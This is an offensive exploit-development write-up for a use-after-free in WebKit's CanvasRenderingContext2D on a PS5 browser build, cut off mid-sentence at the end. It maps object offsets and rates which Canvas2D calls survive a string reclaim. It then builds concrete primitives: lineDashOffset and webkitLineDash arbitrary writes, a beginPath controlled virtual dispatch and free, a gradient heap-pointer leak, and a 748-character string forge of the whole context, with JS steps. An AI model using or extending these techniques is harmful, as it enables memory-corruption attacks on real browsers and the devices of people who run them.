# Canvas2D after string reclaim: every interaction that does not go through `m_stateStack`

**Scope:** PS5 14.10 WK-1400 reference tree
(`/home/violence/Work/WebKit-1400/WebKit-1400/WebKit-1400`), cross-checked
against the mixed `.webkit-src` tree.

**Question:** the freed `CanvasRenderingContext2D` (sizeof 728, bmalloc class 768) has been
reclaimed by a JavaScript string. The stale JS wrapper still points at the
block, but `m_stateStack.m_buffer` now contains string bytes (unmapped), so
`lineWidth`, `setLineDash`, etc. fault. Do we need the getters at all? Can
`setLineDash` be used as a write primitive? Can `isContextLost()` or a JS
prototype override avoid the native path?

**Bottom line:**

* `setLineDash` is **not** a bootstrap write primitive. It dereferences
  `m_stateStack.last()` exactly like the getters and faults first.
* `isContextLost()` **does not exist on Canvas2D** in this WebKit. It is a
  WebGL method. `ctx.isContextLost` is `undefined`; a probe that "does not
  crash" on it has learned nothing.
* Prototype shadowing **does** suppress the native getter, but produces no
  native read/write. It is a crash-isolation tool, not a primitive.
* There are real state-free calls: `getContextAttributes()`, `save()`,
  `restore()` (two safe paths), `createImageData()`, the three
  `create*Gradient()` calls, and `beginPath()`/`closePath()` while
  `m_path` is monostate.
* Two of those are more interesting than the getters:
  `createLinearGradient()` makes the engine write a heap pointer into the
  live string, and `beginPath()`/`closePath()` give a controlled virtual
  dispatch through the `m_path` variant. Neither needs `m_buffer`.
* None of them repairs `m_buffer`. The only ways to get a usable
  `m_buffer` remain (a) **do not reclaim at all** — the inline
  self-pointer `P+128` survives `~Vector` — (b) same-type reclaim,
  (c) a known mapped address, or (d) a reclaim allocation that leaves
  offset +112 untouched.
* `setLineDash` is not the best write even after `m_buffer` is valid.
  `lineDashOffset` is a direct 8-byte write at
  `m_buffer + (size-1)*448 + 184`, with no Vector capacity gate and no
  odd-length append. A 748-character Latin-1 string is a one-byte-per-
  field forge of the 768-byte context; set `m_buffer = T - 184`,
  `size = 1`, and `innerCtx.lineDashOffset = v` writes `v` to `T`.
* The "grow the state stack to 6400 B, free it, reclaim it with an
  ArrayBuffer, forge lineDash" chain is broken: `Vector`'s destructor
  sets `m_buffer = nullptr` and `m_capacity = 0` for every out-of-line
  buffer before freeing it (`Vector.h:349-360`), so the dying context
  does not leave a pointer to the freed state buffer.

---

## 1. Corrected object layout (source + empirical offsets)

The empirical `m_canvas = +32`, `m_stateStack = +112`,
`m_unrealizedSaveCount = +592` offsets are only self-consistent with the
following layout. It is also exactly what the WK-1400 class declarations
give for a release build (`ASSERT_ENABLED=0`, `USE(WEB_THREAD)=0`).

```
+0     vptr (primary, CanvasRenderingContext)
+8     ScriptWrappable::m_wrapper          (JSC::Weak, 8)
+16    CanMakeWeakPtr::m_weakPtrFactory.m_impl (RefPtr, 8)
+24    CanMakeCheckedPtr::m_count          (u32)
+28    m_hasActiveInspectorCanvasCallTracer (bool)
+32    m_canvas                            (CanvasBase&, 8)
+40    CanvasPath vptr (secondary base)
+48    Path m_data                         (std::variant, 64 bytes)
+112   m_stateStack.m_buffer               (Vector<State,1>::m_buffer)
+120   m_stateStack.m_capacity
+124   m_stateStack.m_size
+128   m_stateStack inline State[1]        (448 bytes; compiled layout)
+576   m_dirtyRect                         (FloatRect, 16)
+592   m_unrealizedSaveCount               (u32)
+596   m_usesCSSCompatibilityParseMode
+597   m_usesDisplayListDrawing
+600   m_recordingContext                 (unique_ptr, 8)
+608   m_suppliedColors                   (HashSet, 24)
+632   m_cachedImageData                  (optional<CachedImageData>, 88)
+720   m_settings                         (8)
+728   object end -> bmalloc class 768
```

Why the 448-byte `State`: doc `+112` inline buffer plus a 16-byte
`m_dirtyRect` plus `+592` for `m_unrealizedSaveCount` forces
`sizeof(State) = 448`. The older "State = 400 B" note is inconsistent with
the `+592` device measurement. `Vector<State,1>` itself is 16 bytes
(`buffer, capacity, size`) plus the 448-byte inline buffer.

### 1.1 The Vector field-order correction (important)

`WTF::Vector` is:

```cpp
// Source/WTF/wtf/Vector.h:395-397
T* m_buffer;
unsigned m_capacity;
unsigned m_size;
```

So at object `+112`:

| offset | field | meaning |
|---:|---|---|
| +112 | `m_buffer` | pointer to `State[0]` |
| +120 | `m_capacity` | capacity, **not** size |
| +124 | `m_size` | number of States |
| +128 | inline buffer | first `State` |

Any probe that writes "`m_size = N`" at `+120` is writing **capacity** and
leaving the real `m_size` at `+124` as whatever the reclaim left there.
`state()` computes `m_buffer[(m_size - 1)]` with a 448-byte stride; a
garbage `m_size` produces a wild pointer even if `m_buffer` itself were
valid. This is a plausible explanation for crashes that were blamed only
on `m_buffer`.

### 1.2 State offsets

State-relative offsets consistent with the declarations and the documented
`lineWidth = State+48`, `miterLimit = State+64`, `transform = State+112`,
`lineDash = State+168`:

```
+0    unparsedStrokeColor (String)
+8    unparsedFillColor (String)
+16   strokeStyle (CanvasStyle, 16)
+32   fillStyle (CanvasStyle, 16)
+48   lineWidth (double)
+56   lineCap (byte)
+57   lineJoin (byte)
+64   miterLimit (double)
+72   shadowOffset (FloatSize)
+80   shadowBlur (float)
+88   shadowColor (Color, 8)
+96   globalAlpha (double)
+104  globalComposite (byte)
+105  globalBlend (byte)
+112  transform (AffineTransform, 48)
+160  hasInvertibleTransform (bool)
+168  lineDash (Vector<double>, 16)
+184  lineDashOffset (double)
+192  imageSmoothingEnabled
+193  imageSmoothingQuality
+194  textAlign
+195  textBaseline
+196  direction
+216  unparsedFont (String)
+224  font (FontProxy)
...
```

Two commonly copied offsets are wrong:

* `globalAlpha` is **not** `State+0` (that is `unparsedStrokeColor`) and
  **not** `State+56/64`. It is at `State+96` with the layout above.
* `miterLimit` is `State+64`, not `State+56`.

The `State+168` lineDash offset is consistent; the Vector header inside
the inline State is at object `+128 + 168 = +296`.

Offsets after `miterLimit` depend on `sizeof(Color)` and the resulting
8/16-byte alignment of `AffineTransform`; the values above are the ones
that reproduce the documented `transform = +112` and `lineDash = +168`.
They should be confirmed on device before being used as write targets.
`lineWidth = +48` and `miterLimit = +64` are solid from the declarations.
The tail was reproduced by compiling the real field types: `m_settings`
is at object `+720` (`desynchronized` at string data index 700 for an
8-bit payload), and `sizeof(CanvasRenderingContext2DBase) = 728`, which
places the object in bmalloc class 768 (requests 705..768).

### 1.3 Two vptrs, not one

`CanvasRenderingContext2DBase : CanvasRenderingContext, CanvasPath` has a
primary vptr at `+0` and a `CanvasPath` secondary vptr at `+40`. A string
reclaim overwrites `+0..19` with the `StringImpl` header, which destroys
the primary vptr. It overwrites `+40..47` with string characters, so the
`CanvasPath` vptr is attacker-controlled bytes.

`Path` methods (`moveTo`, `lineTo`, `quadraticCurveTo`, `bezierCurveTo`,
`arc`, `arcTo`, `rect`, `roundRect`, `ellipse`) call the virtual
`hasInvertibleTransform()`. That dispatch uses the `CanvasPath` subobject
vptr at `+40`, and the `CanvasRenderingContext2DBase` override is:

```cpp
// CanvasRenderingContext2DBase.h:396
bool hasInvertibleTransform() const final { return state().hasInvertibleTransform; }
```

So those methods fail **twice**: through the corrupted vptr at `+40` and
then through `state()`. Fixing `m_buffer` alone will not make them work.
`beginPath()` is a `CanvasRenderingContext2DBase` method that calls
`m_path.clear()` directly and is not affected.

---

## 2. `setLineDash` as a write primitive: no, not first

`CanvasRenderingContext2DBase::setLineDash`
(`.scratch/wk-verify/CanvasRenderingContext2DBase.cpp:670`):

```cpp
void CanvasRenderingContext2DBase::setLineDash(const Vector<double>& dash)
{
    if (!lineDashSequenceIsValid(dash))     // input only
        return;

    realizeSaves();                         // counter; if nonzero -> drawingContext() + append
    modifiableState().lineDash = dash;      // m_stateStack.last() -> m_buffer deref
    if (dash.size() % 2)
        modifiableState().lineDash.appendVector(dash);
    applyLineDash();                        // drawingContext() -> m_canvas
}
```

`modifiableState()` is `m_stateStack.last()`
(`CanvasRenderingContext2DBase.h:313`), and `Vector::last()` is
`at(size() - 1)` (`Vector.h:807`). `at()` **does** bounds-check
(`Vector.h:775-779`):

```cpp
T& at(size_t i)
{
    if (UNLIKELY(i >= size()))
        OverflowHandler::overflowed();   // CrashOnOverflow -> CRASH/SIGTRAP
    return Base::buffer()[i];
}
```

With `m_size >= 1` the check passes and the next step is the
`m_buffer[m_size-1]` dereference; an unmapped `m_buffer` faults before
any store, with no JS-level interception. With `m_size == 0`,
`size() - 1` is `SIZE_MAX`, the check fails, and the default
`CrashOnOverflow::overflowed()` calls `CRASH()` — a deterministic
SIGTRAP, **not** an underflow read. (This corrects an earlier note in
this file and in agent 1's writeup: an empty stack is a crash oracle,
never a leak.) `realizeSaves()` can fault even earlier if
`m_unrealizedSaveCount != 0`:

```cpp
void CanvasRenderingContext2DBase::realizeSavesLoop()
{
    GraphicsContext* context = drawingContext();
    do {
        m_stateStack.append(state());       // state() -> m_buffer
        ...
    } while (--m_unrealizedSaveCount);
}
```

So `setLineDash` requires **all** of:

1. `m_unrealizedSaveCount` (`+592`) == 0, or a valid `m_canvas` and
   valid `m_buffer` for `realizeSaves`.
2. `m_stateStack.m_buffer` (`+112`) + `(m_size-1)*448` (`m_size` at
   `+124`) is mapped and writable.
3. `m_canvas` (`+32`) valid enough for `applyLineDash()`, unless
   `drawingContext()` returns null.

Point 3 has a useful nuance: if `m_canvas` is the original
`HTMLCanvasElement`, its current context is the bitmaprenderer context,
and `CanvasBase::drawingContext()` returns `nullptr` immediately because
`context->is2d()` is false:

```cpp
// Source/WebCore/html/CanvasBase.cpp:79
GraphicsContext* CanvasBase::drawingContext() const
{
    auto* context = renderingContext();
    if (context && !context->is2d() && !context->isOffscreen2d())
        return nullptr;
    return buffer() ? &m_imageBuffer->context() : nullptr;
}
```

`applyLineDash()` does `if (!c) return;`, so a valid original canvas
pointer is enough; no 2D `GraphicsContext` is needed. This makes
`setLineDash` usable once `m_buffer` and `m_canvas` are valid, but it does
not remove requirement 2.

### 2.1 What it writes once `m_buffer` is valid

The interesting part is the `Vector<double>` copy assignment, not the
dash values. `Vector::operator=` (`Source/WTF/wtf/Vector.h:988`):

* if `dash.size() <= State.lineDash.m_capacity`, it copies the doubles to
  `State.lineDash.m_buffer` and sets `m_size` — a **write of 8*N bytes to
  an attacker-chosen pointer** (the pointer comes from the fake State's
  `lineDash.m_buffer` at `State+168`);
* if `dash.size() > capacity`, it calls `clear()` (which frees the old
  `m_buffer`) and allocates a new buffer — an **arbitrary free of an
  attacker-chosen pointer**, then writes a fresh heap pointer into the
  fake State at `State+168`.

That is a genuine write-what-where / free primitive, but only **after**
`m_buffer` already points at attacker-controlled memory containing a fake
State. It cannot create that condition.

### 2.2 `lineDashOffset` is the cleaner write

`setLineDash` has a Vector capacity gate, an odd-length second append,
and a `Vector<double>` header to forge. `setLineDashOffset` is a single
8-byte store:

```cpp
// CanvasRenderingContext2DBase.cpp:696
void CanvasRenderingContext2DBase::setLineDashOffset(double offset)
{
    if (!std::isfinite(offset) || state().lineDashOffset == offset)
        return;                                  // reads [T] first
    realizeSaves();                              // counter 0 -> no-op
    modifiableState().lineDashOffset = offset;   // 8-byte store at T
    applyLineDash();                             // m_canvas null-context -> returns
}
```

Set `m_stateStack.m_buffer = T - 184` and `m_size = 1`. Then
`state().lineDashOffset` is exactly the 8 bytes at `T`: the function
reads `[T]`, compares, and stores the new double to `[T]`.
`applyLineDash()` calls `drawingContext()` first; with a valid but
**context-less** `HTMLCanvasElement` at `m_canvas`, `renderingContext()`
is null, `drawingContext()` returns null, and `applyLineDash()` returns
before it touches the rest of the fake State. So the fake State does not
need to exist: only `T` must be readable and writable, and `m_canvas`
must point at a live canvas. `lineWidth` (`T = State+48`) and
`miterLimit` (`T = State+64`) are analogous read/write probes, but they
only accept positive finite doubles; `lineDashOffset` accepts any finite
double including the sign bit.

For multi-double writes, use `setWebkitLineDash` (IDL
`webkitLineDash`, implemented by `setWebkitLineDash`, which does the
copy assignment **without** the odd-length `appendVector`). With a fake
State at a known `X`, set `X+168 = T`, `X+176 = capacity >= N`, and
assign an even-length array; the copy writes N doubles to `T`.

The same `webkitLineDash` attribute is the safest way to exercise the
Vector path: `setLineDash` with odd N does a second append that can
double the write length or free `T`.

---

## 3. `save()` and `restore()`

```cpp
// CanvasRenderingContext2DBase.h:143
void save() { ++m_unrealizedSaveCount; }
```

`save()` is a pure in-place increment of `+592`. It does not touch
`m_stateStack`, `m_canvas`, or the vptr. It is safe and useful as a
liveness/no-crash check, but it is not an observable write.

`restore()`:

```cpp
void CanvasRenderingContext2DBase::restore()
{
    if (m_unrealizedSaveCount) {
        --m_unrealizedSaveCount;
        return;
    }
    if (m_stateStack.size() <= 1)   // reads m_size at +124 only
        return;
    ... state().transform ...       // m_buffer deref
}
```

Two safe paths:

* `m_unrealizedSaveCount != 0`: decrements `+592` and returns.
* counter 0 and `m_size <= 1`: returns after reading `+124`.

Neither gives a useful primitive. The second path is a **crash-free way
to test `m_size` at +124**: if `restore()` survives with counter 0, the
size field is 0 or 1 (or the object is not reachable). `reset()` is not
safe: it calls `unwindStateStack()` (reads size, may call
`canvasBase().existingDrawingContext()`), then `m_stateStack.resize(1)`
and `m_stateStack.first() = State()`, all of which dereference
`m_buffer`/`m_canvas`/`m_path`.

---

## 4. `isContextLost()` does not exist on Canvas2D

`isContextLost` occurs only on `WebGLRenderingContextBase` in WK-1400:

```
Source/WebCore/html/canvas/WebGLRenderingContextBase.idl:600:
    GLboolean isContextLost();
```

The 2D IDL (`CanvasRenderingContext2D.idl` plus all included mixins) has
no such member. Therefore:

* `innerCtx.isContextLost` is an ordinary missing-property lookup: it
  walks the JS prototype chain and returns `undefined` **without touching
  the C++ object at all**. A probe that reads it and does not crash has
  proven nothing about reclaim.
* `innerCtx.isContextLost()` throws `TypeError` in JS before any native
  code runs. A probe that catches that TypeError and reports "safe" is a
  false positive.

The nearest state-free replacement is `getContextAttributes()`:

```cpp
// CanvasRenderingContext2DBase.h:100
const CanvasRenderingContext2DSettings& getContextAttributes() const { return m_settings; }
```

`CanvasRenderingContext2DSettings` is only
`{ bool desynchronized; PredefinedColorSpace colorSpace; }`, at the tail
of the object. Reading it touches no pointer, no `state()`, no vptr. If
the reclaiming string controls the tail bytes, the returned dictionary
reflects them. This is the correct "is the stale wrapper still pointing
at my bytes?" oracle.

`webkitBackingStorePixelRatio` is even safer but useless as an oracle:
it is `static constexpr float webkitBackingStorePixelRatio() { return 1; }`
(`CanvasRenderingContext2DBase.h:214`); the getter returns `1` without
reading the object.

---

## 5. State-free interaction matrix

Legend: **safe** = no `m_stateStack`, no `m_canvas` dereference, no
virtual call on `this`; **canvas** = needs a valid `m_canvas`; **state**
= dereferences `m_buffer`; **vptr** = virtual dispatch through the
corrupted `+0` or `+40` vptr.

| IDL member | Touches | Verdict |
|---|---|---|
| `webkitBackingStorePixelRatio` | nothing | safe, constant |
| `getContextAttributes()` | `m_settings` tail | **safe oracle** |
| `save()` | `+592` | safe, non-observable |
| `restore()` | `+592`, `+124`; else `m_buffer` | safe if counter != 0 or size <= 1 |
| `createImageData(w,h)` | `m_settings.colorSpace` | safe |
| `createImageData(imagedata)` | argument only | safe |
| `createLinearGradient/Radial/Conic` | `m_weakPtrFactory` at `+16` | **safe if `+16` is zero** |
| `beginPath()` | `m_path.clear()` | **safe if `m_path` is monostate** |
| `closePath()` | `m_path.isEmpty()`; PathImpl virtual if index 2 | safe if monostate; virtual dispatch if index 2 |
| `canvas` | `m_canvas` deref + wrapper | canvas |
| `getImageData()` | `m_canvas` + `m_settings` | canvas (no state) |
| `putImageData()` | `m_canvas`, then `didDraw()` -> `state()` | state |
| `createPattern()` | `m_canvas` security origin | canvas |
| `lineWidth`, `miterLimit`, `globalAlpha`, styles, font, etc. | `state()` | state |
| `getTransform`, `setTransform`, `resetTransform` | `state()` | state |
| `setLineDash`, `getLineDash`, `lineDashOffset` | `state()` | state |
| `measureText`, `fillText`, `strokeText` | `state()` | state |
| `fill`, `stroke`, `clip`, `isPointInPath/Stroke` | `state()` | state |
| `fillRect`, `strokeRect`, `clearRect` | `state()` | state |
| `drawImage`, `drawFocusIfNeeded`, `scrollPathIntoView` | `state()`/canvas | state |
| `moveTo`, `lineTo`, curves, `arc`, `rect`, `roundRect`, `ellipse` | virtual `hasInvertibleTransform()` at `+40`, then `state()` | vptr + state |
| `reset()` | `m_stateStack`, `m_path`, `m_canvas` | state |

### 5.1 `create*Gradient()` is a hidden engine write into the string

`CanvasGradient` stores a `WeakPtr<CanvasRenderingContext>`:

```cpp
// CanvasGradient.h:54-55
Ref<Gradient> m_gradient;
WeakPtr<CanvasRenderingContext> m_context;
```

Constructing it calls `CanMakeWeakPtr::weakPtrFactory().createWeakPtr()`.
With `m_impl` (`+16`) zero:

1. `initializeIfNeeded()` allocates a `WeakPtrImpl` and writes its pointer
   to `+16` (`RefPtr<WeakPtrImpl>`);
2. the new `WeakPtr` refs that impl.

Offset `+16..+23` overlaps the live `StringImpl` header and the first
characters:

```
StringImpl:  +0 refCount, +4 length, +8 m_data, +16 hashAndFlags, +20 chars
CRC object:  +16 m_weakPtrFactory.m_impl (8 bytes)
             +16..19 = hashAndFlags, +20..23 = chars[0..1] (16-bit)
```

So a `createLinearGradient()` call on a string-reclaimed context writes a
heap pointer over the string's hash and first code unit(s). For a 16-bit
payload, `payload.charCodeAt(0)` and `charCodeAt(1)` then return bits
32..47 and 48..63 of the `WeakPtrImpl` pointer. That:

* proves a bidirectional engine write into the JS string without any
  `m_buffer` access,
* leaks the high 32 bits of a heap pointer (typically the 4 GB heap
  region, e.g. `0x00000008`),
* does not leak the low 32 bits (they land in `hashAndFlags`, not in the
  character data).

Preconditions for this to be safe:

* the reclaiming string must be **16-bit**; an 8-bit `StringImpl` has
  `hashAndFlags = 0x04 | ...`, so `m_impl` is non-null and
  `initializeIfNeeded()` skips the allocation and dereferences the fake
  pointer;
* `hashAndFlags` must still be zero (do not hash the string: no property
  key use, no `Map`, no atomization);
* chars[0..1] must be zero (they are part of `m_impl`'s high half);
* `m_hasActiveInspectorCanvasCallTracer` (`+28`) must be zero, otherwise
  the generated binding enters `InspectorCanvasCallTracer::recordAction`
  first;
* `m_canvas` (`+32`) is not used by this path, but keep it zero to avoid
  accidental use.

`CanvasGradient::create` itself allocates a `Gradient` and does not touch
`state()` or the vptr.

### 5.2 `beginPath()` / `closePath()`: controlled virtual dispatch via `m_path`

`Path` is a `std::variant<std::monostate, PathSegment,
UniqueRef<PathImpl>>` and occupies `+48..+111`. `beginPath()` is exactly:

```cpp
void CanvasRenderingContext2DBase::beginPath() { m_path.clear(); }
```

`Path::clear()` assigns `std::monostate`. Assignment destroys the current
alternative. If the variant index is `UniqueRef<PathImpl>` and its pointer
is attacker-controlled, this calls `delete` on that pointer: a virtual
deleting-destructor dispatch through an attacker-chosen vptr, followed by
a free. There is no `m_stateStack` access, no `m_canvas` access, and no
virtual call on `this`.

`closePath()` is a `CanvasPath` method; with a non-empty `m_path` it calls
`m_path.fastBoundingRect()`, which for a `UniqueRef` alternative performs
virtual calls (`PathImpl::isEmpty`, `fastBoundingRect`) through the
attacker-chosen pointer.

The layout needs the PS5 toolchain's `std::variant` ABI. PlayStation is a
clang/libc++ target (needs confirmation from the SDK), where libc++
stores the index first. That gives:

```
+48  variant index byte (2 = UniqueRef<PathImpl>)
+56  UniqueRef<PathImpl>::m_ref pointer (8)
```

If the toolchain is libstdc++-style, the index is instead at the end
(`+104`) and the pointer at `+48`. Crafting for one layout and calling
`beginPath()` is a cheap way to distinguish them: index 0 must be a
no-op; index 2 with a controlled pointer produces the dispatch/free.

This is the most promising **control-flow** primitive that does not need
`m_buffer`. It still needs an address for the fake `PathImpl`/vtable, so
it is a post-ASLR-defeat tool, not an ASLR defeat.

### 5.3 `canvas` with a controlled `m_canvas`

`canvas()` is non-virtual:

```cpp
HTMLCanvasElement& canvas() const { return downcast<HTMLCanvasElement>(canvasBase()); }
```

The binding wraps the returned reference. If `m_canvas` points at
controlled writable memory whose `ScriptWrappable` slot is null, the
engine calls `Node::ref()` (a non-virtual increment at
`HTMLCanvasElement`'s Node refcount offset) and writes a JSCell pointer
into `fake+8` via the wrapper cache. That is an arbitrary-address
refcount bump plus a pointer write, and it returns a real JS
`HTMLCanvasElement` wrapper around the fake object. It requires a mapped,
writable address and a fake object that enough HTMLCanvasElement methods
can survive; the width/height getters are virtual through `CanvasBase`.
Without an address it is only a crash oracle.

---

## 6. JS prototype interception: works, but no primitive

Native IDL attributes are accessor properties on
`CanvasRenderingContext2D.prototype`, not own properties on the wrapper.
They are configurable. Therefore:

```js
// stop the native getter from running on the stale object:
Object.defineProperty(innerCtx, 'lineWidth', { value: 42, configurable: true });
innerCtx.lineWidth;                    // 42, no C++ access

// or replace the prototype accessor globally:
const d = Object.getOwnPropertyDescriptor(CanvasRenderingContext2D.prototype, 'lineWidth');
Object.defineProperty(CanvasRenderingContext2D.prototype, 'lineWidth', {
  get() { return 42; }, configurable: true
});
```

What this does:

* **It provably bypasses the native getter.** If `innerCtx.lineWidth`
  still crashes after a shadow, the crash is not from that getter; if it
  stops crashing, the getter is the only thing that was reached. Good
  crash-isolation experiment.
* **It cannot read or write a C++ field.** The value returned is whatever
  the JS getter returns. Calling the saved original
  (`d.get.call(innerCtx)`) still enters C++ and still faults.
* **A Proxy or `setPrototypeOf` only changes JS property lookup.** Native
  code does `state().lineWidth`, not a JS property lookup, so no proxy
  trap is involved.
* **It cannot be used to call the native setter with a different `this`.**
  The bindings type-check the JS wrapper and then use its stored
  `m_wrapped` pointer; you cannot redirect that to a live context without
  corrupting the wrapper itself.
* `instanceof`, `Object.prototype.toString`, `JSON.stringify`,
  `structuredClone`, `WeakRef`, `FinalizationRegistry`, and
  `Object.keys` do not touch `state()`. `structuredClone` throws
  `DataCloneError`; the rest are JS-only.

Useful control sequence:

1. shadow `lineWidth` with a data property;
2. read it (should return the shadow);
3. call `getContextAttributes()` (safe native);
4. delete the shadow and read `lineWidth` (should fault if reclaim is
   real).

This separates "the wrapper is alive" from "the native state is
reachable".

---

## 7. So do we need the getters to pass?

**No, not for reclaim confirmation.** `getContextAttributes()`,
`save()`/`restore()`, `createImageData()`, `create*Gradient()`, and
`beginPath()`/`closePath()` all let you interact with the stale wrapper
without `m_buffer`. `getContextAttributes()` is the observable one; the
others are no-crash checks or side-effect probes.

One lifetime caveat: a string-reclaimed context is **not GC-safe**. The
JS wrapper holds a `Ref<CanvasRenderingContext2D>`; its destructor calls
`CanvasRenderingContext::deref()`, which is
`m_canvas.derefCanvasBase()` — a pure virtual call through the
string-controlled `m_canvas` pointer at `+32`
(`CanvasRenderingContext.cpp:85`, `CanvasBase.h:68`). Keep `innerCtx`
reachable for the whole run; do not let it be finalized. Same-type
reclaim does not have this problem because `m_canvas` is a real canvas.

**Yes, for the actual read/write stage.** Every useful Canvas2D
read/write (`lineWidth`, `fillStyle`, `getTransform`, `getLineDash`,
`setLineDash`, `measureText`) goes through `state()`. `setLineDash` is a
write-what-where only after a fake `State` exists at `m_buffer`; it
cannot create that state. There is no JS-level trick that turns a getter
or setter into a non-`state()` path.

The real objective is not "make the getter pass". It is "make `+112`
point at controlled memory". Once that is true, all the getters and
setters work automatically.

---

## 8. Ways to get a usable `m_buffer`

### 8.0 Do not reclaim at all: the inline self-pointer survives `~Vector`

This is the cheapest path and needs no address. `VectorBuffer`'s
destructor is:

```cpp
// Source/WTF/wtf/Vector.h:349-360
void deallocateBuffer(T* bufferToDeallocate)
{
    if (!bufferToDeallocate) return;
    if (m_buffer == bufferToDeallocate) {
        m_buffer = nullptr;
        m_capacity = 0;
    }
    Malloc::free(bufferToDeallocate);
}
```

`VectorBuffer::deallocateBuffer` returns early when the buffer is the
inline buffer (`Vector.h:513-518`). For `Vector<State,1>`:

* if the stack is **inline** (`size == 1`, no realized saves), the
  destructor compares `m_buffer` with `inlineBuffer()` and returns
  without nulling anything. The freed block still contains
  `m_buffer = P+128`, `m_capacity = 1`, `m_size = 1`, and the inline
  State's POD fields. `state()` works, `m_canvas` at `+32` is still the
  original canvas, and `drawingContext()` is fully valid.
* if the stack grew **out-of-line** (any realized `save()`), the
  destructor writes `m_buffer = 0`, `m_capacity = 0` into the freed
  block before freeing the out-of-line buffer. The stale object can
  never recover a valid `m_buffer` from that state.

So the exploit should first test the **no-reclaim cold state**:

1. trigger the UAF with zero `save()` calls, so the stack stays inline;
2. immediately call `innerCtx.canvas === canvas` (reads `+32`, no
   `state()`);
3. call `innerCtx.lineWidth` (reads `State+48` through the surviving
   `P+128`).

If those return, the freed context is a fully functional 2d context with
no address knowledge. Do not allocate any 768-byte object between the
free and the read; that is what recycles the block. From there, a
post-free `save()` + a state setter makes `realizeSavesLoop` call
`allocateBuffer`, which mallocs a fresh **out-of-line** State buffer and
writes a valid heap pointer into `+112` — the engine re-arms the object.
The only remaining missing piece is a target address for arbitrary R/W.

The corollary is important: **do not grow the stack before the free**.
The current chain's "8x save → 6400 B out-of-line buffer → free → AB
reclaim → forge lineDash" cannot work, because the dying Vector nulls
`m_buffer`/`m_capacity` in the context. The context would point at null,
not at the reclaimed AB.

### 8.1 Same-type reclaim (best, already proven)

Spray live `CanvasRenderingContext2D` objects after the free. The
reclaimer initializes `m_buffer` to its own inline State at `object+128`,
and `m_canvas` to its own canvas. Result: valid `m_buffer`, valid
`m_canvas`, GC-safe. This is V573/V630. If it still reproduces on the
target build, it dominates every string-reclaim trick for the R/W stage.

A two-stage variant, if string control is needed first:

1. trigger the UAF;
2. reclaim with the string to get the oracle/leak;
3. drop every reference to the string and force GC/allocation pressure so
   the `StringImpl` block is freed;
4. spray 2D contexts; one reclaims the block and restores a valid
   inline State.

The stale `innerCtx` wrapper survives throughout; it does not keep the
string or the C++ object alive (the context is not refcounted by the
wrapper's `deref()`; `CanvasRenderingContext::deref()` only derefs
`m_canvas`).

### 8.2 Known mapped address + `size = 1`

If a leak gives any mapped address `A`:

* write `A` at `+112`;
* write `1` at `+124` (`m_size`), and `>= 1` at `+120` (`m_capacity`);
* write `0` at `+592` (`m_unrealizedSaveCount`).

Then `state()` reads `A`, and `lineWidth` reads the double at `A+48`.
This is the existing crash oracle, now with a correct size field.

For `setLineDash` on a fake State at `A`, also set `m_canvas` (`+32`) to
a valid `HTMLCanvasElement` pointer, or a pointer whose
`renderingContext()` is non-2D (the original canvas works because its
current context is the bitmaprenderer).

Do **not** point `m_buffer` at JSC's structure heap reservation:
`StructureAlignedMemoryAllocator` uses
`OSAllocator::tryReserveUncommittedAligned(..., PROT_NONE)`; the range is
reserved but not committed and reading it faults.

### 8.3 Reclaim with an allocation that leaves `+112` untouched

This is the only way to keep the original self-pointer
(`object+128`) without a leak. The requirement is an allocation of the
same bmalloc class (768 bytes) that initializes fewer than 112
bytes.

Normal `StringImpl` reclaim always writes from `+20` to the end of the
string, so it destroys `+112` even for a short string in the same class:
bmalloc size classes are per request, and a short string request is not
in the 704/768 class.

Source-level slack candidates exist but do not reach the needed ratio:

* `StringBuffer<T>::shrink()` only changes the length; the buffer keeps
  its original capacity. `TextCodecUTF8` and `TextCodecCJK` use this.
  But for a 704-byte buffer, UTF-8's best compression to Latin-1 is
  about 3:1 (≈234 bytes written), and UTF-16 output is at least half the
  input; both write past `+112`. `StringBuilder::shrinkToFit()` (XHR's
  `responseText` path) reallocates when the buffer is <80% full, and XHR
  does not reserve capacity from `Content-Length`, so a 704-byte
  capacity with a <112-byte length is not reachable.
* `StringBuilder` doubles its capacity, so `toStringPreserveCapacity`
  retains at most about 2x slack (length just over half capacity), not
  the 6.3x needed to leave `+112` untouched with a 704-byte buffer.
* `String::adopt(Vector)` keeps the vector's capacity, but the only
  JS-reachable caller (`String.prototype.toWellFormed`) sizes the vector
  to the input length.

So this is a real design direction, but not currently demonstrated with
a JS-reachable allocation. It should not be counted on.

### 8.4 `reset()` would mint the self-pointer, but it is not JS-reachable

`CanvasRenderingContext2DBase::reset()` is the one engine path that can
rebuild the stack from a zeroed `Vector`:

```cpp
m_stateStack.resize(1);        // grow(1) -> allocateBuffer(1) if capacity 0
m_stateStack.first() = State();
```

With `m_buffer = 0`, `m_capacity = 0`, `m_size = 0`, `resize(1)` calls
`VectorBuffer::allocateBuffer(1)`, which sets
`m_buffer = inlineBuffer()` — i.e. `P+128`, computed from `this`, with
no address knowledge — and `m_capacity = 1`; then a default State is
constructed. `unwindStateStack()` is harmless at `size = 0` because the
`if (size_t stackSize = ...)` body is skipped, so it does not touch
`m_canvas` either.

The blocker is reachability. `ctx.reset()` is **not in the 14.10 IDL**
(checked `CanvasRenderingContext2D.idl` and all included mixins). The
only caller is `HTMLCanvasElement::reset()` (width/height attribute
change), and it calls `downcast<CanvasRenderingContext2D>(*m_context)
.reset()` only when the canvas's **current** context is 2D. The canvas's
current context is the bitmaprenderer, so our stale object is never
reset. `OffscreenCanvas::reset()` has the same issue and OffscreenCanvas
is not available on this target. Unless a canvas-to-`P` binding is
found, this address-minting gadget is unreachable.

### 8.5 Post-leak forge: 748-char Latin-1 string + `lineDashOffset`

Once a leak gives `T` (target) and `C` (a live, context-less
`HTMLCanvasElement`), the whole context can be forged with one 8-bit
string. A 748-character Latin-1 `StringImpl` requests
`20 + 748 = 768` bytes (bmalloc class 67); its characters map one byte
per object offset `+20+i`.

Zero-fill all 748 bytes, then set:

| object offset | char index | value |
|---:|---:|---|
| `+16` | (header) | hashAndFlags = `0x04` for 8-bit; `m_weakPtrFactory` is non-null, so do **not** call `create*Gradient()` on this forge |
| `+28` | 8 | `0` (inspector tracer) |
| `+32` | 12 | `C` (live context-less canvas) |
| `+112` | 92 | `T - 184` (`m_stateStack.m_buffer`) |
| `+120` | 100 | `4` (capacity) |
| `+124` | 104 | `1` (size) |
| `+592` | 572 | `0` (`m_unrealizedSaveCount`) |

Then `innerCtx.lineDashOffset = v` reads and writes the 8 bytes at `T`.
`innerCtx.lineDashOffset` reads `T` without writing. The primary vptr at
